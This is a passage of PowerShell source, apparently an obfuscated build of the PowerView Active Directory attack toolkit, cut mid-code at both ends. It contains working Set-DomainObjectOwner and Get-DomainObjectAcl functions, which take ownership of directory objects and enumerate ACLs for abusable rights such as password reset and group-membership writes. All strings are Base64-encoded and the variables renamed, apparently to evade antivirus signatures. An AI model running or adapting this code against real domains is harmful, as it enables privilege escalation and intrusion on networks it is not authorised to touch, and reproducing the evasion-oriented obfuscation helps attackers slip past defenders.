ArgumentList $Identity, ${a00882beeb4041e19e9a5758b4bc37a1}, 
$AuditFlag, 
([System.DirectoryServices.ActiveDirectorySecurityInheritance]$Inher
itanceType)
            } elseif($ObjectType -eq $null -and 
$InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne 
$null) {
                New-Object 
System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList 
$Identity, ${a00882beeb4041e19e9a5758b4bc37a1}, $AuditFlag, 
([System.DirectoryServices.ActiveDirectorySecurityInheritance]$Inher
itanceType), $InheritedObjectType
            } elseif($ObjectType -
ne $null -and $InheritanceType -eq [String]::Empty -and 
$InheritedObjectType -eq $null) {
                New-Object 
System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList 
$Identity, ${a00882beeb4041e19e9a5758b4bc37a1}, $AuditFlag, 
$ObjectType
            } elseif($ObjectType -ne $null -and 
$InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq 
$null) {
                New-Object 
System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList 
$Identity, ${a00882beeb4041e19e9a5758b4bc37a1}, $AuditFlag, 
$ObjectType, $InheritanceType
            } elseif($ObjectType -ne 
$null -and $InheritanceType -ne [String]::Empty -and 
$InheritedObjectType -ne $null) {
                New-Object 
System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList 
$Identity, ${a00882beeb4041e19e9a5758b4bc37a1}, $AuditFlag, 
$ObjectType, $InheritanceType, $InheritedObjectType
            }
     
   }
        else {
            if($ObjectType -eq $null -and 
$InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq 
$null) {
                New-Object 
System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList 
$Identity, ${a00882beeb4041e19e9a5758b4bc37a1}, $AccessControlType
   
         } elseif($ObjectType -eq $null -and $InheritanceType -ne 
[String]::Empty -and $InheritedObjectType -eq $null) {
               
 New-Object System.DirectoryServices.ActiveDirectoryAccessRule -
ArgumentList $Identity, ${a00882beeb4041e19e9a5758b4bc37a1}, 
$AccessControlType, 
([System.DirectoryServices.ActiveDirectorySecurityInheritance]$Inher
itanceType)
            } elseif($ObjectType -eq $null -and 
$InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne 
$null) {
                New-Object 
System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList 
$Identity, ${a00882beeb4041e19e9a5758b4bc37a1}, $AccessControlType, 
([System.DirectoryServices.ActiveDirectorySecurityInheritance]$Inher
itanceType), $InheritedObjectType
            } elseif($ObjectType -
ne $null -and $InheritanceType -eq [String]::Empty -and 
$InheritedObjectType -eq $null) {
                New-Object 
System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList 
$Identity, ${a00882beeb4041e19e9a5758b4bc37a1}, $AccessControlType, 
$ObjectType
            } elseif($ObjectType -ne $null -and 
$InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq 
$null) {
                New-Object 
System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList 
$Identity, ${a00882beeb4041e19e9a5758b4bc37a1}, $AccessControlType, 
$ObjectType, $InheritanceType
            } elseif($ObjectType -ne 
$null -and $InheritanceType -ne [String]::Empty -and 
$InheritedObjectType -ne $null) {
                New-Object 
System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList 
$Identity, ${a00882beeb4041e19e9a5758b4bc37a1}, $AccessControlType, 
$ObjectType, $InheritanceType, $InheritedObjectType
            }
     
   }
    }
}
function Set-DomainObjectOwner {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSUseShouldProcessForStateChangingFunctions', '')]
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        
[Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = 
$True, ValueFromPipelineByPropertyName = $True)]
        [Alias
('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
     
   $Identity,
        [Parameter(Mandatory = $True)]
        
[ValidateNotNullOrEmpty()]
        [Alias('Owner')]
        [String]
   
     $OwnerIdentity,
        [ValidateNotNullOrEmpty()]
        
[String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        
[Alias('Filter')]
        [String]
        $LDAPFilter,
        
[ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        
[String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
       
 [Alias('DomainController')]
        [String]
        $Server,
        
[ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        
$SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        
[Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 
10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        
$Tombstone,
        [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
${ea43c787582f45539b7f519da4680c7a} = @{}
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${38876e007fb144bfb1ed92915febb673} = Get-DomainObject 
@ea43c787582f45539b7f519da4680c7a -Identity $OwnerIdentity -
Properties objectsid | Select-Object -ExpandProperty objectsid
       
 if (${38876e007fb144bfb1ed92915febb673}) {
            
${cfd135255d544a1d9d3e25f2e96e2255} = 
[System.Security.Principal.SecurityIdentifier]${38876e007fb144bfb1ed
92915febb673}
        }
        else {
            Write-Warning 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AE8AdwBuAGUAcgBdACAARQ
ByAHIAbwByACAAcABhAHIAcwBpAG4AZwAgAG8AdwBuAGUAcgAgAGkAZABlAG4AdABpAH
QAeQAgACcAJABPAHcAbgBlAHIASQBkAGUAbgB0AGkAdAB5ACcA')))
        }
    
}
    PROCESS {
        if (${cfd135255d544a1d9d3e25f2e96e2255}) {
     
       ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBhAHcA')))] = $True
            
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity
            
${c01497bafce6425daf8f6db24c0f2c92} = Get-DomainObject 
@ea43c787582f45539b7f519da4680c7a
            ForEach ($Object in 
${c01497bafce6425daf8f6db24c0f2c92}) {
                try {
          
          Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AE8AdwBuAGUAcgBdACAAQQ
B0AHQAZQBtAHAAdABpAG4AZwAgAHQAbwAgAHMAZQB0ACAAdABoAGUAIABvAHcAbgBlAH
IAIABmAG8AcgAgACcAJABJAGQAZQBuAHQAaQB0AHkAJwAgAHQAbwAgACcAJABPAHcAbg
BlAHIASQBkAGUAbgB0AGkAdAB5ACcA')))
                    
${325030b50e5d4e96be02a5e3ef70a9a8} = 
${c01497bafce6425daf8f6db24c0f2c92}.GetDirectoryEntry()
              
      
${325030b50e5d4e96be02a5e3ef70a9a8}.PsBase.Options.SecurityMasks = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwB3AG4AZQByAA==')))
                    
${325030b50e5d4e96be02a5e3ef70a9a8}.PsBase.ObjectSecurity.SetOwner
(${cfd135255d544a1d9d3e25f2e96e2255})
                    
${325030b50e5d4e96be02a5e3ef70a9a8}.PsBase.CommitChanges()
           
     }
                catch {
                    Write-Warning 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AE8AdwBuAGUAcgBdACAARQ
ByAHIAbwByACAAcwBlAHQAdABpAG4AZwAgAG8AdwBuAGUAcgA6ACAAJABfAA==')))
   
             }
            }
        }
    }
}
function Get-
DomainObjectAcl {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    
[CmdletBinding()]
    Param (
        [Parameter(Position = 0, 
ValueFromPipeline = $True, ValueFromPipelineByPropertyName = 
$True)]
        [Alias('DistinguishedName', 'SamAccountName', 
'Name')]
        [String[]]
        $Identity,
        [Switch]
        
$Sacl,
        [Switch]
        $ResolveGUIDs,
        [String]
        
[Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 
'WriteMembers')]
        $RightsFilter,
        
[ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        
[ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
  
      $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias
('ADSPath')]
        [String]
        $SearchBase,
        
[ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        
[String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 
'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        
[ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 
200,
        [ValidateRange(1, 10000)]
        [Int]
        
$ServerTimeLimit,
        [Switch]
        $Tombstone,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
${ea43c787582f45539b7f519da4680c7a} = @{
            'Properties' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAbgB0AHMAZQBjAHUAcgBpAHQAeQ
BkAGUAcwBjAHIAaQBwAHQAbwByACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAG
EAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
        }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBhAGMAbAA=')))]) {
            
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBhAGMAbAA=')))
        }
        else {
            
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABhAGMAbAA=')))
        }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) { ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${148160fac3314bdc82ee9f4c583c0c4a} = Get-DomainSearcher 
@ea43c787582f45539b7f519da4680c7a
        
${7de72c613b564fe6b860d019ffecb06f} = @{}
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${7de72c613b564fe6b860d019ffecb06f}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))]) { ${7de72c613b564fe6b860d019ffecb06f}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${7de72c613b564fe6b860d019ffecb06f}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${7de72c613b564fe6b860d019ffecb06f}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${7de72c613b564fe6b860d019ffecb06f}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBHAFUASQBEAHMA')))]) 
{
            ${ca3d4121ac6f47a0a0442dc1d46ba182} = Get-DomainGUIDMap 
@7de72c613b564fe6b860d019ffecb06f
        }
    }
    PROCESS {
        
if (${148160fac3314bdc82ee9f4c583c0c4a}) {
            
${987d1cda8c15450d8512978866836ba0} = ''
            $Filter = ''
     
       $Identity | Where-Object {$_} | ForEach-Object {
              
  ${0c2b6ec1d84e4c9188d4d73c607426d3} = $_.Replace('(', 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('XAAyADkA'))))
                if 
(${0c2b6ec1d84e4c9188d4d73c607426d3} -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBTAC0AMQAtAC4AKgA=')))) {
                    
${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewAwAGMAMgBiADYAZQBjADEAZAA4ADQAZQ
A0AGMAOQAxADgAOABkADQAZAA3ADMAYwA2ADAANwA0ADIANgBkADMAfQApAA==')))
   
             }
                elseif 
(${0c2b6ec1d84e4c9188d4d73c607426d3} -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgAoAEMATgB8AE8AVQB8AEQAQwApAD0ALgAqAA==')))) {
                    
${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAMABjADIAYg
A2AGUAYwAxAGQAOAA0AGUANABjADkAMQA4ADgAZAA0AGQANwAzAGMANgAwADcANAAyAD
YAZAAzAH0AKQA=')))
                    if ((-not $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        
${84423cbf5a544fd6aa05dc7201f84256} = 
${0c2b6ec1d84e4c9188d4d73c607426d3}.SubString
(${0c2b6ec1d84e4c9188d4d73c607426d3}.IndexOf
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
       
                 Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEEAYwBsAF0AIABFAHgAdA
ByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAHsAOAA0ADQAMgAzAGMAYgBmAD
UAYQA1ADQANABmAGQANgBhAGEAMAA1AGQAYwA3ADIAMAAxAGYAOAA0ADIANQA2AH0AJw
AgAGYAcgBvAG0AIAAnACQAewAwAGMAMgBiADYAZQBjADEAZAA4ADQAZQA0AGMAOQAxAD
gAOABkADQAZAA3ADMAYwA2ADAANwA0ADIANgBkADMAfQAnAA==')))
               
         ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = ${84423cbf5a544fd6aa05dc7201f84256}
        
                ${148160fac3314bdc82ee9f4c583c0c4a} = Get-
DomainSearcher @ea43c787582f45539b7f519da4680c7a
                     
   if (-not ${148160fac3314bdc82ee9f4c583c0c4a}) {
                   
         Write-Warning $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEEAYwBsAF0AIABVAG4AYQ
BiAGwAZQAgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAGQAbwBtAGEAaQBuACAAcwBlAG
EAcgBjAGgAZQByACAAZgBvAHIAIAAnACQAewA4ADQANAAyADMAYwBiAGYANQBhADUANA
A0AGYAZAA2AGEAYQAwADUAZABjADcAMgAwADEAZgA4ADQAMgA1ADYAfQAnAA==')))
   
                     }
                    }
                }
         
       elseif (${0c2b6ec1d84e4c9188d4d73c607426d3} -imatch 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQ
AtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
            
        ${3e0cccb945b440b99b2100f08845f4a8} = 
(([Guid]${0c2b6ec1d84e4c9188d4d73c607426d3}).ToByteArray() | 
ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                 
   ${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7ADMAZQAwAGMAYwBjAGIAOQA0ADUAYg
A0ADQAMABiADkAOQBiADIAMQAwADAAZgAwADgAOAA0ADUAZgA0AGEAOAB9ACkA')))
   
             }
                elseif 
(${0c2b6ec1d84e4c9188d4d73c607426d3}.Contains('.')) {
                
    ${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAB8ACgAcwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJAB7ADAAYwAyAGIANg
BlAGMAMQBkADgANABlADQAYwA5ADEAOAA4AGQANABkADcAMwBjADYAMAA3ADQAMgA2AG
QAMwB9ACkAKABuAGEAbQBlAD0AJAB7ADAAYwAyAGIANgBlAGMAMQBkADgANABlADQAYw
A5ADEAOAA4AGQANABkADcAMwBjADYAMAA3ADQAMgA2AGQAMwB9ACkAKABkAG4AcwBoAG
8AcwB0AG4AYQBtAGUAPQAkAHsAMABjADIAYgA2AGUAYwAxAGQAOAA0AGUANABjADkAMQ
A4ADgAZAA0AGQANwAzAGMANgAwADcANAAyADYAZAAzAH0AKQApAA==')))
           
     }
                else {
                    
${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAB8ACgAcwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJAB7ADAAYwAyAGIANg
BlAGMAMQBkADgANABlADQAYwA5ADEAOAA4AGQANABkADcAMwBjADYAMAA3ADQAMgA2AG
QAMwB9ACkAKABuAGEAbQBlAD0AJAB7ADAAYwAyAGIANgBlAGMAMQBkADgANABlADQAYw
A5ADEAOAA4AGQANABkADcAMwBjADYAMAA3ADQAMgA2AGQAMwB9ACkAKABkAGkAcwBwAG
wAYQB5AG4AYQBtAGUAPQAkAHsAMABjADIAYgA2AGUAYwAxAGQAOAA0AGUANABjADkAMQ
A4ADgAZAA0AGQANwAzAGMANgAwADcANAAyADYAZAAzAH0AKQApAA==')))
           
     }
            }
            if 
(${987d1cda8c15450d8512978866836ba0} -and 
(${987d1cda8c15450d8512978866836ba0}.Trim() -ne '') ) {
              
  $Filter += $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAB8ACQAewA5ADgANwBkADEAYwBkAGEAOABjADEANQA0ADUAMABkADgANQAxADIAOQ
A3ADgAOAA2ADYAOAAzADYAYgBhADAAfQApAA==')))
            }
            
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
   
             Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEEAYwBsAF0AIABVAHMAaQ
BuAGcAIABhAGQAZABpAHQAaQBvAG4AYQBsACAATABEAEEAUAAgAGYAaQBsAHQAZQByAD
oAIAAkAEwARABBAFAARgBpAGwAdABlAHIA')))
                $Filter += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            if 
($Filter) {
                
${148160fac3314bdc82ee9f4c583c0c4a}.filter = 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAmACQARgBpAGwAdABlAHIAKQA=')))
            }
            Write-
Verbose "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: 
$(${148160fac3314bdc82ee9f4c583c0c4a}.filter)"
            
${9f78951ba80c437e9db41515f07bc24e} = 
${148160fac3314bdc82ee9f4c583c0c4a}.FindAll()
            
${9f78951ba80c437e9db41515f07bc24e} | Where-Object {$_} | ForEach-
Object {
                $Object = $_.Properties
                if 
($Object.objectsid -and $Object.objectsid[0]) {
                    
$ObjectSid = (New-Object 
System.Security.Principal.SecurityIdentifier($Object.objectsid
[0],0)).Value
                }
                else {
                 
   $ObjectSid = $Null
                }
                try {
          
          New-Object Security.AccessControl.RawSecurityDescriptor -
ArgumentList $Object[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('bgB0AHMAZQBjAHUAcgBpAHQAeQBkAGUAcwBjAHIAaQBwAHQAbwByAA==')))][0], 
0 | ForEach-Object { if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBhAGMAbAA=')))]) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | 
ForEach-Object {
                        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBpAGcAaAB0AHMARgBpAGwAdABlAHIA')))]) {
                           
 ${ab60642cfdad4aa794979e386ee76820} = Switch ($RightsFilter) {
      
                          $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAZQB0AFAAYQBzAHMAdwBvAHIAZAA='))) { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('MAAwADIAOQA5ADUANwAwAC0AMgA0ADYAZAAtADEAMQBkADAALQBhADcANgA4AC0AMA
AwAGEAYQAwADAANgBlADAANQAyADkA'))) }
                                
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA'))) { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('YgBmADkANgA3ADkAYwAwAC0AMABkAGUANgAtADEAMQBkADAALQBhADIAOAA1AC0AMA
AwAGEAYQAwADAAMwAwADQAOQBlADIA'))) }
                                
Default { $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('MAAwADAAMAAwADAAMAAwAC0AMAAwADAAMAAtADAAMAAwADAALQAwADAAMAAwAC0AMA
AwADAAMAAwADAAMAAwADAAMAAwADAA'))) }
                            }
    
                        if ($_.ObjectType -eq 
